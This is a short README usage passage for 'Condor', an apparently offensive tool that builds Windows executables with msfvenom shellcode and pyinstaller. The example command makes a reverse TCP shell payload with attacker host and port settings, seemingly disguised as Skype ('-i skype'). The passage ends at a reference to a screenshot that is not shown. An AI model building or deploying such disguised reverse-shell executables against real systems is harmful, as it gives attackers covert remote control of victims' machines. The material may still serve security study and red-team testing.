## Usage

It is recommended to run the tool in a WSL environment, as you will need to generate shellcodes using msfvenom and compile to EXE using pyinstaller.

```
$ git clone https://github.com/MrEmpy/Condor.git
$ cd Condor
$ chmod +x install.sh
$ sudo ./install.sh
...
$ python3 condor.py -p windows/x64/shell/reverse_tcp -lh <LOCAL HOST> -lp <LOCAL PORT> -i skype
```

It is necessary to have wine installed on the machine to be able to install Python. Install as shown in the screenshot:
